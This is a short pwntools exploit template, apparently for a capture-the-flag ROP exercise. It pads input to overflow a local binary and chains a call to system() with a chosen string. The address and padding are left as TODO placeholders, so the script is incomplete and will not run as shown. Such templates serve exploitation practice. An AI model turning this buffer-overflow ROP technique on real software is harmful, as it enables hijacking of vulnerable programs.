#!/usr/bin/python

import sys
from pwn import *

# Error handling cause I'm a good software engineer... lol jks
if (len(sys.argv) != 2):
    log.failure("Usage: %s <binary>" % sys.argv[0])
    exit(1)

# Create a ROP object to look up symbols
elf = context.binary = ELF(sys.argv[1])
rop = ROP(elf)

# String to call with system?
# $ rabin2 -z split gets interesting strings...?
addr = #TODO - address of system arg
info("String at: " + hex(addr))

# Build system chain
rop.system(addr)
info("ROP chain:\n" + rop.dump())
payload = "A"* #TODO - padding size
payload += rop.chain() 
info("Payload: " + payload)

# Pwn
p = process(sys.argv[1])
p.recvuntil('> ') #TODO - CHANGE THIS
p.sendline(payload)
print p.recvall()
